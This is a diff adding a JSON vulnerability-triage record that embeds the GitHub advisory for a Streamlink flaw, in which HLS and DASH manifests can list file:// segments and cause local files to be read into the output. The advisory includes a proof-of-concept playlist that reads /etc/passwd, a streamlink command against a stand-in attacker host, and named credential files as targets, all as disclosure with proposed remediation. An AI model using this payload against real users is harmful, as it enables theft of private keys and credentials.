@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/119168908?v=4\", \"events_url\": \"https://api.github.com/users/4tkD0g/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/4tkD0g/followers\", \"following_url\": \"https://api.github.com/users/4tkD0g/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/4tkD0g/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/4tkD0g\", \"id\": 119168908, \"login\": \"4tkD0g\", \"node_id\": \"U_kgDOBxpfjA\", \"organizations_url\": \"https://api.github.com/users/4tkD0g/orgs\", \"received_events_url\": \"https://api.github.com/users/4tkD0g/received_events\", \"repos_url\": \"https://api.github.com/users/4tkD0g/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/4tkD0g/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/4tkD0g/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/4tkD0g\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/467294?v=4\", \"events_url\": \"https://api.github.com/users/bastimeyer/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/bastimeyer/followers\", \"following_url\": \"https://api.github.com/users/bastimeyer/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/bastimeyer/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/bastimeyer\", \"id\": 467294, \"login\": \"bastimeyer\", \"node_id\": \"MDQ6VXNlcjQ2NzI5NA==\", \"organizations_url\": \"https://api.github.com/users/bastimeyer/orgs\", \"received_events_url\": \"https://api.github.com/users/bastimeyer/received_events\", \"repos_url\": \"https://api.github.com/users/bastimeyer/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/bastimeyer/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/bastimeyer/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/bastimeyer\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44353\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-73\", \"name\": \"External Control of File Name or Path\"}], \"description\": \"## Summary\\n\\nStreamlink's HLS and DASH parsers do not validate the URI scheme of segment entries and other resources. A remote `.m3u8` HLS playlist or `.mpd` DASH manifest can list `file:///path/to/file` as a segment, and streamlink will read that local file and write its contents to the output stream.\\n\\nConfirmed on streamlink 8.3.0 (latest release at time of report).\\n\\n## Description\\n\\nSegment URIs from an HLS playlist or DASH manifest are passed to the worker without any scheme check. The underlying HTTP session accepts `file://` URIs, which resolve against the local filesystem. There is no scheme allowlist at the parser level, so any path readable by the streamlink process is treated as a valid segment.\\n\\nThe attacker does not need local access to the victim. A playlist/manifest hosted on an attacker-controlled server, fetched by streamlink on the victim's machine, is enough to trigger the read.\\n\\n## Impact\\n\\nA remote attacker hosting a malicious playlist/manifest can make any client running streamlink against that URL read arbitrary local files within the streamlink process's read scope and write them into the output file.\\n\\nReachable files depend on the user running streamlink. Typical targets: `~/.ssh/id_*` private keys, `~/.aws/credentials`, shell history, application config files holding API tokens, and world-readable system files like `/etc/passwd`.\\n\\n### Affected scenarios\\n\\n- Server-side or automated deployments (recording bots, media pipelines, CI jobs processing playlists). The output file is often uploaded, logged, or otherwise exposed, which gives direct disclosure to attacker-reachable locations.\\n- Interactive desktop use. File contents land on the victim's disk and can leak through secondary channels: the user sharing the recording, cloud sync, backup, etc.\\n\\nThis bug does not on its own send file contents back to the attacker. The disclosure goes to the output sink. Full exfiltration depends on what happens to that file afterward.\\n\\n## Steps to reproduce\\n\\nTested on streamlink 8.3.0, Linux (Kali).\\n\\n1. Save as `playlist.m3u8`:\\n\\n    ```m3u\\n    #EXTM3U\\n    #EXT-X-VERSION:3\\n    #EXT-X-TARGETDURATION:5\\n    #EXT-X-PLAYLIST-TYPE:VOD\\n    #EXTINF:5.0,\\n    file:///etc/passwd\\n    #EXT-X-ENDLIST\\n    ```\\n\\n2. Host the playlist on a remote server reachable by the victim. For testing, a VPS, a tunnel (cloudflared, ngrok), or a static host like GitHub Pages all work.\\n\\n3. On the victim machine:\\n\\n    ```sh\\n    streamlink \\\"hls://https://attacker-host.example/playlist.m3u8\\\" best -o /tmp/proof.ts\\n    ```\\n\\n3. Inspect the output:\\n\\n    ```sh\\n    cat /tmp/proof.ts\\n    ```\\n\\n4. The output contains the contents of `/etc/passwd` from the machine running streamlink.\\n\\n### Local reproduction (equivalent, simpler to set up):\\n\\n```sh\\npython3 -m http.server 8080    # in directory containing playlist.m3u8\\nstreamlink \\\"hls://http://127.0.0.1:8080/playlist.m3u8\\\" best -o /tmp/proof.ts\\ncat /tmp/proof.ts\\n```\\n\\nThe remote case was confirmed independently using a tunnel.\\n\\n## Proposed remediation\\n\\nAllowlist http and https for segment URIs in the HLS parser. Reject any other scheme (file, ftp, data, etc.) at parse time, before the URI reaches the fetcher.\\n\\nThe check needs to cover:\\n\\n- Segment URIs in the top-level manifest.\\n- Segment URIs in nested manifests pulled during playback (variant playlists referenced from a master playlist).\\n- Other URI fields the fetcher consumes — `#EXT-X-KEY` and `#EXT-X-MAP` URIs at minimum. Worth auditing the rest for the same issue.\\n\\nThe check belongs in the parser, not the fetcher. Putting it next to the untrusted input means downstream callers don't each need to re-implement it, and any future fetcher path inherits the protection by default.\", \"epss\": {\"percentage\": 0.00345, \"percentile\": 0.2651}, \"ghsa_id\": \"GHSA-hgqw-6m45-hw5f\", \"github_reviewed_at\": \"2026-05-11T14:28:30Z\", \"html_url\": \"https://github.com/advisories/GHSA-hgqw-6m45-hw5f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hgqw-6m45-hw5f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44353\"}], \"nvd_published_at\": \"2026-05-27T17:16:38Z\", \"published_at\": \"2026-05-11T14:28:30Z\", \"references\": [\"https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44353\", \"https://github.com/pypa/advisory-database/tree/main/vulns/streamlink/PYSEC-2026-180.yaml\", \"https://github.com/advisories/GHSA-hgqw-6m45-hw5f\"], \"repository_advisory_url\": \"https://api.github.com/repos/streamlink/streamlink/security-advisories/GHSA-hgqw-6m45-hw5f\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/streamlink/streamlink\", \"summary\": \"Streamlink has an arbitrary local file read via file:// URI in HLS and DASH\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:49:43Z\", \"url\": \"https://api.github.com/advisories/GHSA-hgqw-6m45-hw5f\", \"vulnerabilities\": [{\"first_patched_version\": \"8.4.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"streamlink\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 8.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hgqw-6m45-hw5f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "streamlink: <= 8.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-44353"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "streamlink"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.008385Z",
+  "provenance": {
+    "content_sha256": "07619577a335d27da39097435e3db2341a74f3f9019f5503acb629b6ebea12d0",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-11T14:28:30Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hgqw-6m45-hw5f",
+  "status": "active",
+  "title": "Streamlink has an arbitrary local file read via file:// URI in HLS and DASH",
+  "updated_at": "2026-06-08T23:49:43Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hgqw-6m45-hw5f"
+}
